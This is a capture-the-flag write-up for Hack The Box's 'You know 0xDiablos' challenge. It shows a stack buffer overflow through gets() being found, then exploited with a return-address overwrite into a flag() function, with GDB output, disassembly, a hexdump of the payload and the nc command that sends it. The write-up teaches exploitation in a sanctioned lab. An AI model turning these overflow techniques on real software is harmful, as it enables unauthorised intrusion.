# You know 0xDiablos

### Vulnrability 
```bash
./vuln 
You know who are 0xDiablos: 
hi
hi
```

Try a bunch of code injection and none worked. Maybe lets try sending a bunch of 'A's.

```bash
python - c "print('A'*100)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Maybe try more 
```bash
python -c "print('A'*250)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: done                python -c "print('A'*250)" | 
zsh: segmentation fault  ./vuln

```
Looks like I was able to crash it. We should run it in Ghidra to see if I can take advantage of this. 

### Discovering how to Exploit
Open and look over main method.

```C
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(undefined1 param_1)

{
  __gid_t __rgid;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```
Bet vuln has a buffer overflow 

```C
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```

Now we can use GDB to debug and see if we can get control of the stack pointer.

**List functions**

```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  gets@plt
0x08049050  fgets@plt
0x08049060  getegid@plt
0x08049070  puts@plt
0x08049080  exit@plt
0x08049090  __libc_start_main@plt
0x080490a0  setvbuf@plt
0x080490b0  fopen@plt
0x080490c0  setresgid@plt
0x080490d0  _start
0x08049110  _dl_relocate_static_pie
0x08049120  __x86.get_pc_thunk.bx
0x08049130  deregister_tm_clones
0x08049170  register_tm_clones
0x080491b0  __do_global_dtors_aux
0x080491e0  frame_dummy
0x080491e2  flag
0x08049272  vuln
0x080492b1  main
0x08049330  __libc_csu_init
0x08049390  __libc_csu_fini
0x08049391  __x86.get_pc_thunk.bp
0x08049398  _fini
``` 

**Set breakpoint and step through**
We do this to see what is happening when we crash the program.

```bash
gdb) break main
Breakpoint 1 at 0x80492c0
(gdb) run
Starting program: /home/user/Documents/AllTheFlags/Hack The Box/Tracks/Beginner Track/You know 0xDiablos/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080492c0 in main ()
(gdb) step
Single stepping until exit from function main,
which has no line number information.
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
**Back-up and take control**
```bash
(gdb) run < input.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln < input.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos:

Breakpoint 1, 0x08049272 in vuln ()
(gdb) info frame
Stack level 0, frame at 0xffffd460:
 eip = 0x8049272 in vuln; saved eip = 0x8049318
 called by frame at 0xffffd490
 Arglist at 0xffffd458, args:
 Locals at 0xffffd458, Previous frame's sp is 0xffffd460
 Saved registers:
  eip at 0xffffd45c

(gdb) info registers
eax            0x1d                29
ecx            0xf7fa29b8          -134600264
edx            0x1                 1
ebx            0x804c000           134529024
esp            0xffffd45c          0xffffd45c
ebp            0xffffd478          0xffffd478
esi            0x8049330           134517552
edi            0xf7ffcb80          -134231168
eip            0x8049272           0x8049272 <vuln>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99

(gdb) x/8x $esp
0xffffd45c:     0x08049318      0xffffd4a0      0xf7fc1678      0xf7fc1b40
0xffffd46c:     0x00000000      0xffffd490      0xf7fa0ff4      0x00000000

(gdb) disass flag
Dump of assembler code for function flag:
   0x080491e2 <+0>:     push   ebp
   0x080491e3 <+1>:     mov    ebp,esp
   0x080491e5 <+3>:     push   ebx
   0x080491e6 <+4>:     sub    esp,0x54
   0x080491e9 <+7>:     call   0x8049120 <__x86.get_pc_thunk.bx>
   0x080491ee <+12>:    add    ebx,0x2e12
   0x080491f4 <+18>:    sub    esp,0x8
   0x080491f7 <+21>:    lea    eax,[ebx-0x1ff8]
   0x080491fd <+27>:    push   eax
   0x080491fe <+28>:    lea    eax,[ebx-0x1ff6]
   0x08049204 <+34>:    push   eax
   0x08049205 <+35>:    call   0x80490b0 <fopen@plt>
   0x0804920a <+40>:    add    esp,0x10
   0x0804920d <+43>:    mov    DWORD PTR [ebp-0xc],eax
   0x08049210 <+46>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x08049214 <+50>:    jne    0x8049232 <flag+80>
   0x08049216 <+52>:    sub    esp,0xc
   0x08049219 <+55>:    lea    eax,[ebx-0x1fec]
   0x0804921f <+61>:    push   eax
   0x08049220 <+62>:    call   0x8049070 <puts@plt>
   0x08049225 <+67>:    add    esp,0x10
   0x08049228 <+70>:    sub    esp,0xc
   0x0804922b <+73>:    push   0x0
   0x0804922d <+75>:    call   0x8049080 <exit@plt>
   0x08049232 <+80>:    sub    esp,0x4
   0x08049235 <+83>:    push   DWORD PTR [ebp-0xc]
   0x08049238 <+86>:    push   0x40
   0x0804923a <+88>:    lea    eax,[ebp-0x4c]
   0x0804923d <+91>:    push   eax
   0x0804923e <+92>:    call   0x8049050 <fgets@plt>
   0x08049243 <+97>:    add    esp,0x10
   0x08049246 <+100>:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804924d <+107>:   jne    0x8049269 <flag+135>
   0x0804924f <+109>:   cmp    DWORD PTR [ebp+0xc],0xc0ded00d
   0x08049256 <+116>:   jne    0x804926c <flag+138>
   0x08049258 <+118>:   sub    esp,0xc
   0x0804925b <+121>:   lea    eax,[ebp-0x4c]
   0x0804925e <+124>:   push   eax
   0x0804925f <+125>:   call   0x8049030 <printf@plt>
   0x08049264 <+130>:   add    esp,0x10
   0x08049267 <+133>:   jmp    0x804926d <flag+139>
   0x08049269 <+135>:   nop
   0x0804926a <+136>:   jmp    0x804926d <flag+139>
   0x0804926c <+138>:   nop
   0x0804926d <+139>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049270 <+142>:   leave
   0x08049271 <+143>:   ret
End of assembler dump.
```
### Build getFlag File
Now that we have figured out how to take control lets add it to our getFlag.txt file, we need to remember to have 'deadbeef' and 'c0ded00d' as the function will only run if those are included in the function call.

```txt
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000090: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000b0: 4141 4141 4141 4141 4141 4141 e291 0408  AAAAAAAAAAAA....
000000c0: 4141 4141 efbe adde 0dd0 dec0 0a         AAAA.........
```

### Trying it out 
```bash
echo "$(cat input.txt)" | nc <server> <port>
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
HTB{<flag string>}
```
It worked and we got the flag!

